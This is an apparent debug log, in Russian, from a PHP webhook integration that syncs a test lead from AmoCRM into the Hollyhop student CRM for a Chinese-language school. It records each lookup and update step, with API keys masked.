[2026-02-11 22:34:10] [INFO] [index.php] Вебхук от AmoCRM получен
{
    "leads": {
        "status": [
            {
                "id": "29382117",
                "status_id": "66403690",
                "pipeline_id": "7909930",
                "old_status_id": "81896134",
                "old_pipeline_id": "7909930"
            }
        ]
    },
    "account": {
        "id": "31625686",
        "subdomain": "directorchinatutorru"
    }
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:10] [INFO] [index.php] Обработка события: изменение статуса сделки
{
    "lead_id": 29382117
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:11] [DEBUG] [amo_func.php] GET запрос к AmoCRM API выполнен успешно
{
    "code": 200,
    "url": "/api/v4/leads/29382117?with=contacts"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:11] [INFO] [index.php] Данные сделки получены из AmoCRM
{
    "lead_id": 29382117
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:11] [INFO] [index.php] Вебхук от AmoCRM получен
{
    "leads": {
        "status": [
            {
                "id": "29382117",
                "status_id": "81896134",
                "pipeline_id": "7909930",
                "old_status_id": "66403690",
                "old_pipeline_id": "7909930"
            }
        ]
    },
    "account": {
        "id": "31625686",
        "subdomain": "directorchinatutorru"
    }
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:11] [INFO] [index.php] Обработка события: изменение статуса сделки
{
    "lead_id": 29382117
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:11] [DEBUG] [amo_func.php] GET запрос к AmoCRM API выполнен успешно
{
    "code": 200,
    "url": "/api/v4/contacts/34414183"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:11] [INFO] [index.php] clientId
--------------------------------------------------------------------------------
[2026-02-11 22:34:11] [INFO] [index.php] Данные подготовлены для отправки в Hollyhop
{
    "Status": "В наборе",
    "link": "https://directorchinatutorru.amocrm.ru/leads/detail/29382117",
    "gender": "F",
    "amo_lead_id": 29382117,
    "amo_subdomain": "directorchinatutorru",
    "discipline": "Китайский",
    "learningType": "Мини-группа",
    "maturity": "Дошкольники",
    "officeOrCompanyId": "Курская",
    "level": "A1",
    "firstName": "тестовый",
    "lastName": "студент",
    "phone": "79922370054",
    "email": "test233@test.com"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:11] [INFO] [index.php] Начало вызова add_student.php
{
    "url": "https://srm.chinatutor.ru/add_student.php",
    "timeout": 120
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:11] [DEBUG] [amo_func.php] GET запрос к AmoCRM API выполнен успешно
{
    "code": 200,
    "url": "/api/v4/leads/29382117?with=contacts"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:11] [INFO] [index.php] Данные сделки получены из AmoCRM
{
    "lead_id": 29382117
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:11] [INFO] [unknown] ═══════════════════════════════════════════════════════════
[]
--------------------------------------------------------------------------------
[2026-02-11 22:34:11] [INFO] [unknown] НАЧАЛО ОБРАБОТКИ ЗАПРОСА add_student.php
{
    "timestamp": "2026-02-11 22:34:11",
    "request_method": "POST",
    "content_type": "application/json"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:11] [INFO] [unknown] ═══════════════════════════════════════════════════════════
[]
--------------------------------------------------------------------------------
[2026-02-11 22:34:11] [INFO] [unknown] ШАГ 1: Получение данных из POST запроса
[]
--------------------------------------------------------------------------------
[2026-02-11 22:34:11] [INFO] [unknown] Получены POST данные
{
    "has_data": true,
    "data_keys": [
        "Status",
        "link",
        "gender",
        "amo_lead_id",
        "amo_subdomain",
        "discipline",
        "learningType",
        "maturity",
        "officeOrCompanyId",
        "level",
        "firstName",
        "lastName",
        "phone",
        "email"
    ],
    "data_preview": "{\n    \"Status\": \"В наборе\",\n    \"link\": \"https:\\/\\/directorchinatutorru.amocrm.ru\\/leads\\/detail\\/29382117\",\n    \"gender\": \"F\",\n    \"amo_lead_id\": 29382117,\n    \"amo_subdomain\": \"directorchinatutorru\",\n    \"discipline\": \"Китайский\",\n    \"learningType\": \"Мини-группа\",\n    \"maturity\": \"Дошкольники\",\n    \"officeOrCompanyId\": \"Курская\",\n    \"level\": \"A1\",\n    \"firstName\": \"тестовый\",\n    \"lastName\": \"студент\",\n    \"phone\": \"79922370054\",\n    \"email\": \"test233@test.com\"\n}"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:11] [INFO] [unknown] ШАГ 2: Валидация входных данных
[]
--------------------------------------------------------------------------------
[2026-02-11 22:34:11] [INFO] [unknown] Валидация пройдена успешно
[]
--------------------------------------------------------------------------------
[2026-02-11 22:34:11] [INFO] [unknown] ШАГ 3: Маппинг и подготовка данных студента
[]
--------------------------------------------------------------------------------
[2026-02-11 22:34:11] [INFO] [unknown] Маппинг gender
{
    "исходное": "F",
    "преобразовано": "false (женский)"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:11] [INFO] [unknown] learningType: найден в маппинге
{
    "исходное": "Мини-группа",
    "преобразовано": "Мини-группа"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:11] [INFO] [unknown] maturity: найден в маппинге
{
    "исходное": "Дошкольники",
    "преобразовано": "4-6 лет"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:11] [INFO] [unknown] officeOrCompanyId: найден в маппинге
{
    "название": "Курская",
    "ID": 2
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:11] [INFO] [unknown] Подготовленные параметры для AddStudent API
{
    "params": {
        "firstName": "тестовый",
        "lastName": "студент",
        "gender": false,
        "phone": "79922370054",
        "email": "test233@test.com",
        "discipline": "Китайский",
        "level": "A1",
        "learningType": "Мини-группа",
        "maturity": "4-6 лет",
        "officeOrCompanyId": 2,
        "Status": "В наборе"
    },
    "params_count": 11,
    "has_gender": true,
    "has_level": true,
    "has_learningType": true,
    "has_officeOrCompanyId": true
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:11] [INFO] [unknown] ШАГ 4: Поиск существующего студента по телефону
[]
--------------------------------------------------------------------------------
[2026-02-11 22:34:11] [INFO] [unknown] Поиск существующего студента по телефону
{
    "phone": "79922370054"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:11] [INFO] [unknown] Нормализованный номер для поиска
{
    "original": "79922370054",
    "normalized": "79922370054"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:11] [INFO] [unknown] Попытка поиска с параметром: phone
{
    "phone": "79922370054"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:11] [DEBUG] [amo_func.php] GET запрос к AmoCRM API выполнен успешно
{
    "code": 200,
    "url": "/api/v4/contacts/34414183"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:11] [INFO] [index.php] clientId
--------------------------------------------------------------------------------
[2026-02-11 22:34:11] [INFO] [index.php] Данные подготовлены для отправки в Hollyhop
{
    "Status": "В наборе",
    "link": "https://directorchinatutorru.amocrm.ru/leads/detail/29382117",
    "gender": "F",
    "amo_lead_id": 29382117,
    "amo_subdomain": "directorchinatutorru",
    "discipline": "Китайский",
    "learningType": "Мини-группа",
    "maturity": "Дошкольники",
    "officeOrCompanyId": "Курская",
    "level": "A1",
    "firstName": "тестовый",
    "lastName": "студент",
    "phone": "79922370054",
    "email": "test233@test.com"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:11] [INFO] [index.php] Начало вызова add_student.php
{
    "url": "https://srm.chinatutor.ru/add_student.php",
    "timeout": 120
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:11] [INFO] [unknown] ═══════════════════════════════════════════════════════════
[]
--------------------------------------------------------------------------------
[2026-02-11 22:34:11] [INFO] [unknown] НАЧАЛО ОБРАБОТКИ ЗАПРОСА add_student.php
{
    "timestamp": "2026-02-11 22:34:11",
    "request_method": "POST",
    "content_type": "application/json"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:11] [INFO] [unknown] ═══════════════════════════════════════════════════════════
[]
--------------------------------------------------------------------------------
[2026-02-11 22:34:11] [INFO] [unknown] ШАГ 1: Получение данных из POST запроса
[]
--------------------------------------------------------------------------------
[2026-02-11 22:34:11] [INFO] [unknown] Получены POST данные
{
    "has_data": true,
    "data_keys": [
        "Status",
        "link",
        "gender",
        "amo_lead_id",
        "amo_subdomain",
        "discipline",
        "learningType",
        "maturity",
        "officeOrCompanyId",
        "level",
        "firstName",
        "lastName",
        "phone",
        "email"
    ],
    "data_preview": "{\n    \"Status\": \"В наборе\",\n    \"link\": \"https:\\/\\/directorchinatutorru.amocrm.ru\\/leads\\/detail\\/29382117\",\n    \"gender\": \"F\",\n    \"amo_lead_id\": 29382117,\n    \"amo_subdomain\": \"directorchinatutorru\",\n    \"discipline\": \"Китайский\",\n    \"learningType\": \"Мини-группа\",\n    \"maturity\": \"Дошкольники\",\n    \"officeOrCompanyId\": \"Курская\",\n    \"level\": \"A1\",\n    \"firstName\": \"тестовый\",\n    \"lastName\": \"студент\",\n    \"phone\": \"79922370054\",\n    \"email\": \"test233@test.com\"\n}"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:11] [INFO] [unknown] ШАГ 2: Валидация входных данных
[]
--------------------------------------------------------------------------------
[2026-02-11 22:34:11] [INFO] [unknown] Валидация пройдена успешно
[]
--------------------------------------------------------------------------------
[2026-02-11 22:34:11] [INFO] [unknown] ШАГ 3: Маппинг и подготовка данных студента
[]
--------------------------------------------------------------------------------
[2026-02-11 22:34:11] [INFO] [unknown] Маппинг gender
{
    "исходное": "F",
    "преобразовано": "false (женский)"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:11] [INFO] [unknown] learningType: найден в маппинге
{
    "исходное": "Мини-группа",
    "преобразовано": "Мини-группа"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:11] [INFO] [unknown] maturity: найден в маппинге
{
    "исходное": "Дошкольники",
    "преобразовано": "4-6 лет"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:11] [INFO] [unknown] officeOrCompanyId: найден в маппинге
{
    "название": "Курская",
    "ID": 2
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:11] [INFO] [unknown] Подготовленные параметры для AddStudent API
{
    "params": {
        "firstName": "тестовый",
        "lastName": "студент",
        "gender": false,
        "phone": "79922370054",
        "email": "test233@test.com",
        "discipline": "Китайский",
        "level": "A1",
        "learningType": "Мини-группа",
        "maturity": "4-6 лет",
        "officeOrCompanyId": 2,
        "Status": "В наборе"
    },
    "params_count": 11,
    "has_gender": true,
    "has_level": true,
    "has_learningType": true,
    "has_officeOrCompanyId": true
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:11] [INFO] [unknown] ШАГ 4: Поиск существующего студента по телефону
[]
--------------------------------------------------------------------------------
[2026-02-11 22:34:11] [INFO] [unknown] Поиск существующего студента по телефону
{
    "phone": "79922370054"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:11] [INFO] [unknown] Нормализованный номер для поиска
{
    "original": "79922370054",
    "normalized": "79922370054"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:11] [INFO] [unknown] Попытка поиска с параметром: phone
{
    "phone": "79922370054"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:14] [INFO] [add_student.php] API запрос: GetStudents
{
    "url": "https://evrasia20.t8s.ru/Api/V2/GetStudents",
    "http_code": 200,
    "request_params": {
        "phone": "79922370054",
        "authkey": "***hidden***"
    }
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:14] [INFO] [add_student.php] API ответ успешно получен
{
    "function": "GetStudents",
    "response_structure": [
        "Students",
        "Now"
    ],
    "response_type": "array"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:14] [INFO] [unknown] Ответ GetStudents получен для параметра phone
{
    "type": "array",
    "is_empty": false,
    "is_array": true
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:14] [INFO] [unknown] Попытка поиска с параметром: term
{
    "term": "79922370054"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:14] [INFO] [add_student.php] API запрос: GetStudents
{
    "url": "https://evrasia20.t8s.ru/Api/V2/GetStudents",
    "http_code": 200,
    "request_params": {
        "term": "79922370054",
        "authkey": "***hidden***"
    }
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:14] [INFO] [add_student.php] API ответ успешно получен
{
    "function": "GetStudents",
    "response_structure": [
        "Students",
        "Now"
    ],
    "response_type": "array"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:14] [INFO] [unknown] Ответ GetStudents получен для параметра term
{
    "type": "array",
    "is_empty": false,
    "is_array": true
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:14] [INFO] [unknown] Попытка поиска с параметром: search
{
    "search": "79922370054"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:15] [INFO] [add_student.php] API запрос: GetStudents
{
    "url": "https://evrasia20.t8s.ru/Api/V2/GetStudents",
    "http_code": 200,
    "request_params": {
        "phone": "79922370054",
        "authkey": "***hidden***"
    }
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:15] [INFO] [add_student.php] API ответ успешно получен
{
    "function": "GetStudents",
    "response_structure": [
        "Students",
        "Now"
    ],
    "response_type": "array"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:15] [INFO] [unknown] Ответ GetStudents получен для параметра phone
{
    "type": "array",
    "is_empty": false,
    "is_array": true
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:15] [INFO] [unknown] Попытка поиска с параметром: term
{
    "term": "79922370054"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:15] [INFO] [add_student.php] API запрос: GetStudents
{
    "url": "https://evrasia20.t8s.ru/Api/V2/GetStudents",
    "http_code": 200,
    "request_params": {
        "term": "79922370054",
        "authkey": "***hidden***"
    }
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:15] [INFO] [add_student.php] API ответ успешно получен
{
    "function": "GetStudents",
    "response_structure": [
        "Students",
        "Now"
    ],
    "response_type": "array"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:15] [INFO] [unknown] Ответ GetStudents получен для параметра term
{
    "type": "array",
    "is_empty": false,
    "is_array": true
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:15] [INFO] [unknown] Попытка поиска с параметром: search
{
    "search": "79922370054"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:18] [INFO] [add_student.php] API запрос: GetStudents
{
    "url": "https://evrasia20.t8s.ru/Api/V2/GetStudents",
    "http_code": 200,
    "request_params": {
        "search": "79922370054",
        "authkey": "***hidden***"
    }
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:18] [INFO] [add_student.php] API ответ успешно получен
{
    "function": "GetStudents",
    "response_structure": [
        "Students",
        "Now"
    ],
    "response_type": "array"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:18] [INFO] [unknown] Ответ GetStudents получен для параметра search
{
    "type": "array",
    "is_empty": false,
    "is_array": true
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:18] [INFO] [unknown] Попытка поиска с параметром: q
{
    "q": "79922370054"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:18] [INFO] [add_student.php] API запрос: GetStudents
{
    "url": "https://evrasia20.t8s.ru/Api/V2/GetStudents",
    "http_code": 200,
    "request_params": {
        "search": "79922370054",
        "authkey": "***hidden***"
    }
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:18] [INFO] [add_student.php] API ответ успешно получен
{
    "function": "GetStudents",
    "response_structure": [
        "Students",
        "Now"
    ],
    "response_type": "array"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:18] [INFO] [unknown] Ответ GetStudents получен для параметра search
{
    "type": "array",
    "is_empty": false,
    "is_array": true
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:18] [INFO] [unknown] Попытка поиска с параметром: q
{
    "q": "79922370054"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:21] [INFO] [add_student.php] API запрос: GetStudents
{
    "url": "https://evrasia20.t8s.ru/Api/V2/GetStudents",
    "http_code": 200,
    "request_params": {
        "q": "79922370054",
        "authkey": "***hidden***"
    }
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:21] [INFO] [add_student.php] API ответ успешно получен
{
    "function": "GetStudents",
    "response_structure": [
        "Students",
        "Now"
    ],
    "response_type": "array"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:21] [INFO] [unknown] Ответ GetStudents получен для параметра q
{
    "type": "array",
    "is_empty": false,
    "is_array": true
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:21] [INFO] [unknown] Результаты поиска
{
    "total_candidates": 1001,
    "matched_students": 1,
    "search_param_used": "q"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:21] [INFO] [unknown] ✓✓✓ НАЙДЕН студент с ТОЧНЫМ совпадением телефона
{
    "search_param": "q",
    "Id": 22209,
    "ClientId": 4044,
    "total_matched": 1
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:21] [INFO] [unknown] Студент найден по телефону, данные не обновляем, используем существующие
{
    "Id": 22209,
    "ClientId": 4044
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:21] [INFO] [unknown] ШАГ 5: Создание или обновление студента
{
    "is_update": true,
    "has_existing_student": true
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:21] [INFO] [unknown] Пропуск создания студента - используется существующий
{
    "existing_id": 22209,
    "existing_clientId": 4044
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:21] [INFO] [unknown] ШАГ 6: Извлечение ID студента из ответа
[]
--------------------------------------------------------------------------------
[2026-02-11 22:34:21] [INFO] [unknown] Используем данные существующего студента
{
    "Id": 22209,
    "ClientId": 4044
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:21] [INFO] [unknown] Используется существующий студент (данные не обновляются), Id: 22209
--------------------------------------------------------------------------------
[2026-02-11 22:34:21] [INFO] [unknown] ШАГ 7: Обновление контактных данных
{
    "is_update": true,
    "has_client_id": true,
    "has_phone": true,
    "has_email": true
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:21] [INFO] [unknown] ШАГ 8: Получение полного профиля студента через GetStudents
{
    "client_id": 4044,
    "student_id": 22209
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:21] [INFO] [unknown] Запрос GetStudents с clientId: 4044
[]
--------------------------------------------------------------------------------
[2026-02-11 22:34:21] [INFO] [unknown] Запрос GetStudents с параметром clientId (прямой поиск)
--------------------------------------------------------------------------------
[2026-02-11 22:34:21] [INFO] [add_student.php] API запрос: GetStudents
{
    "url": "https://evrasia20.t8s.ru/Api/V2/GetStudents",
    "http_code": 200,
    "request_params": {
        "clientId": 4044,
        "authkey": "***hidden***"
    }
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:21] [INFO] [add_student.php] API ответ успешно получен
{
    "function": "GetStudents",
    "response_structure": [
        "Students",
        "Now"
    ],
    "response_type": "array"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:21] [INFO] [unknown] Ответ GetStudents: объект с полем Students
{
    "students_count": 1,
    "now": "2026-02-11T19:34:21"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:21] [INFO] [unknown] Ответ от GetStudents API получен
{
    "has_direct_student": false,
    "is_array": true,
    "count": 1
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:21] [INFO] [unknown] Поиск студента с ClientId = 4044 в массиве из 1 студентов
--------------------------------------------------------------------------------
[2026-02-11 22:34:21] [INFO] [unknown] Структура студента #0
{
    "keys": [
        "ClientId",
        "Id",
        "Created",
        "Updated",
        "FirstName",
        "LastName",
        "Gender",
        "AddressDate",
        "StatusId",
        "Status",
        "Mobile",
        "UseMobileBySystem",
        "EMail",
        "UseEMailBySystem",
        "Maturity",
        "LearningTypes",
        "Disciplines",
        "OfficesAndCompanies",
        "ExtraFields"
    ],
    "ClientId": 4044,
    "Id": 22209
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:21] [INFO] [unknown] Студент #0: ClientId=4044, Id=22209
--------------------------------------------------------------------------------
[2026-02-11 22:34:21] [INFO] [unknown] ✓ НАЙДЕН студент #0 с ClientId = 4044
--------------------------------------------------------------------------------
[2026-02-11 22:34:21] [INFO] [unknown] ✓ Получен Id профиля: 22209
--------------------------------------------------------------------------------
[2026-02-11 22:34:21] [INFO] [unknown] ШАГ 9: Формирование ответа
{
    "student_id_from_api": 22209,
    "client_id": 4044,
    "is_update": true
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:21] [INFO] [unknown] ШАГ 10: Обновление поля 'Сделки АМО' в Hollyhop
{
    "has_amo_lead_id": true,
    "has_client_id": true,
    "amo_lead_id": 29382117
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:21] [INFO] [unknown] Начало обработки поля 'Сделки АМО'
{
    "amo_lead_id": 29382117,
    "client_id": 4044
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:21] [INFO] [unknown] Получение имени менеджера из AmoCRM
{
    "amo_lead_id": 29382117,
    "amo_subdomain": "directorchinatutorru"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:21] [INFO] [unknown] Запрос данных сделки из AmoCRM
{
    "api_url": "/api/v4/leads/29382117"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:21] [DEBUG] [amo_func.php] GET запрос к AmoCRM API выполнен успешно
{
    "code": 200,
    "url": "/api/v4/leads/29382117"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:21] [INFO] [unknown] Данные сделки получены из AmoCRM
{
    "has_responsible_user_id": true,
    "responsible_user_id": 10787738
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:22] [DEBUG] [amo_func.php] GET запрос к AmoCRM API выполнен успешно
{
    "code": 200,
    "url": "/api/v4/users/10787738"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:22] [INFO] [unknown] Имя менеджера получено из AmoCRM
{
    "responsible_user_id": 10787738,
    "manager_name": "Юлия",
    "lead_id": 29382117,
    "user_response_structure": "array"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:22] [INFO] [unknown] Получение текущих данных студента для обновления поля 'Сделки АМО'
{
    "client_id": "98b0ad7f-864b-47a6-9650-b4bf32aa8927"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:22] [INFO] [add_student.php] API запрос: GetStudents
{
    "url": "https://evrasia20.t8s.ru/Api/V2/GetStudents",
    "http_code": 200,
    "request_params": {
        "q": "79922370054",
        "authkey": "***hidden***"
    }
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:22] [INFO] [add_student.php] API ответ успешно получен
{
    "function": "GetStudents",
    "response_structure": [
        "Students",
        "Now"
    ],
    "response_type": "array"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:22] [INFO] [unknown] Ответ GetStudents получен для параметра q
{
    "type": "array",
    "is_empty": false,
    "is_array": true
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:22] [INFO] [unknown] Результаты поиска
{
    "total_candidates": 1001,
    "matched_students": 1,
    "search_param_used": "q"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:22] [INFO] [unknown] ✓✓✓ НАЙДЕН студент с ТОЧНЫМ совпадением телефона
{
    "search_param": "q",
    "Id": 22209,
    "ClientId": 4044,
    "total_matched": 1
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:22] [INFO] [unknown] Студент найден по телефону, данные не обновляем, используем существующие
{
    "Id": 22209,
    "ClientId": 4044
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:22] [INFO] [unknown] ШАГ 5: Создание или обновление студента
{
    "is_update": true,
    "has_existing_student": true
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:22] [INFO] [unknown] Пропуск создания студента - используется существующий
{
    "existing_id": 22209,
    "existing_clientId": 4044
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:22] [INFO] [unknown] ШАГ 6: Извлечение ID студента из ответа
[]
--------------------------------------------------------------------------------
[2026-02-11 22:34:22] [INFO] [unknown] Используем данные существующего студента
{
    "Id": 22209,
    "ClientId": 4044
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:22] [INFO] [unknown] Используется существующий студент (данные не обновляются), Id: 22209
--------------------------------------------------------------------------------
[2026-02-11 22:34:22] [INFO] [unknown] ШАГ 7: Обновление контактных данных
{
    "is_update": true,
    "has_client_id": true,
    "has_phone": true,
    "has_email": true
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:22] [INFO] [unknown] ШАГ 8: Получение полного профиля студента через GetStudents
{
    "client_id": 4044,
    "student_id": 22209
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:22] [INFO] [unknown] Запрос GetStudents с clientId: 4044
[]
--------------------------------------------------------------------------------
[2026-02-11 22:34:22] [INFO] [unknown] Запрос GetStudents с параметром clientId (прямой поиск)
--------------------------------------------------------------------------------
[2026-02-11 22:34:22] [INFO] [add_student.php] API запрос: GetStudents
{
    "url": "https://evrasia20.t8s.ru/Api/V2/GetStudents",
    "http_code": 200,
    "request_params": {
        "clientId": 4044,
        "authkey": "***hidden***"
    }
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:22] [INFO] [add_student.php] API ответ успешно получен
{
    "function": "GetStudents",
    "response_structure": [
        "Students",
        "Now"
    ],
    "response_type": "array"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:22] [INFO] [unknown] Ответ GetStudents: объект с полем Students
{
    "students_count": 1,
    "now": "2026-02-11T19:34:22"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:22] [INFO] [unknown] Ответ от GetStudents API получен
{
    "has_direct_student": false,
    "is_array": true,
    "count": 1
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:22] [INFO] [unknown] Поиск студента с ClientId = 4044 в массиве из 1 студентов
--------------------------------------------------------------------------------
[2026-02-11 22:34:22] [INFO] [unknown] Структура студента #0
{
    "keys": [
        "ClientId",
        "Id",
        "Created",
        "Updated",
        "FirstName",
        "LastName",
        "Gender",
        "AddressDate",
        "StatusId",
        "Status",
        "Mobile",
        "UseMobileBySystem",
        "EMail",
        "UseEMailBySystem",
        "Maturity",
        "LearningTypes",
        "Disciplines",
        "OfficesAndCompanies",
        "ExtraFields"
    ],
    "ClientId": 4044,
    "Id": 22209
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:22] [INFO] [unknown] Студент #0: ClientId=4044, Id=22209
--------------------------------------------------------------------------------
[2026-02-11 22:34:22] [INFO] [unknown] ✓ НАЙДЕН студент #0 с ClientId = 4044
--------------------------------------------------------------------------------
[2026-02-11 22:34:22] [INFO] [unknown] ✓ Получен Id профиля: 22209
--------------------------------------------------------------------------------
[2026-02-11 22:34:22] [INFO] [unknown] ШАГ 9: Формирование ответа
{
    "student_id_from_api": 22209,
    "client_id": 4044,
    "is_update": true
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:22] [INFO] [unknown] ШАГ 10: Обновление поля 'Сделки АМО' в Hollyhop
{
    "has_amo_lead_id": true,
    "has_client_id": true,
    "amo_lead_id": 29382117
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:22] [INFO] [unknown] Начало обработки поля 'Сделки АМО'
{
    "amo_lead_id": 29382117,
    "client_id": 4044
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:22] [INFO] [unknown] Получение имени менеджера из AmoCRM
{
    "amo_lead_id": 29382117,
    "amo_subdomain": "directorchinatutorru"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:22] [INFO] [unknown] Запрос данных сделки из AmoCRM
{
    "api_url": "/api/v4/leads/29382117"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:23] [DEBUG] [amo_func.php] GET запрос к AmoCRM API выполнен успешно
{
    "code": 200,
    "url": "/api/v4/leads/29382117"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:23] [INFO] [unknown] Данные сделки получены из AmoCRM
{
    "has_responsible_user_id": true,
    "responsible_user_id": 10787738
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:23] [DEBUG] [amo_func.php] GET запрос к AmoCRM API выполнен успешно
{
    "code": 200,
    "url": "/api/v4/users/10787738"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:23] [INFO] [unknown] Имя менеджера получено из AmoCRM
{
    "responsible_user_id": 10787738,
    "manager_name": "Юлия",
    "lead_id": 29382117,
    "user_response_structure": "array"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:23] [INFO] [unknown] Получение текущих данных студента для обновления поля 'Сделки АМО'
{
    "client_id": "98b0ad7f-864b-47a6-9650-b4bf32aa8927"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:26] [INFO] [add_student.php] API запрос: GetStudents
{
    "url": "https://evrasia20.t8s.ru/Api/V2/GetStudents",
    "http_code": 200,
    "request_params": {
        "clientId": "98b0ad7f-864b-47a6-9650-b4bf32aa8927",
        "authkey": "***hidden***"
    }
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:26] [INFO] [add_student.php] API ответ успешно получен
{
    "function": "GetStudents",
    "response_structure": [
        "Students",
        "Now"
    ],
    "response_type": "array"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:26] [INFO] [unknown] Данные студента получены
{
    "has_student_data": true,
    "data_type": "array",
    "has_ExtraFields": false
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:26] [INFO] [unknown] ШАГ 11: Формирование финального ответа
{
    "success": true,
    "operation": "updated",
    "clientId": "98b0ad7f-864b-47a6-9650-b4bf32aa8927",
    "Id": 22209
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:26] [INFO] [unknown] ═══════════════════════════════════════════════════════════
[]
--------------------------------------------------------------------------------
[2026-02-11 22:34:26] [INFO] [unknown] УСПЕШНОЕ ЗАВЕРШЕНИЕ ОБРАБОТКИ ЗАПРОСА add_student.php
{
    "timestamp": "2026-02-11 22:34:26",
    "operation": "updated",
    "clientId": "98b0ad7f-864b-47a6-9650-b4bf32aa8927",
    "profile_id": 22209,
    "execution_time_seconds": 14.65
}
--------------------------------------------------------------------------------
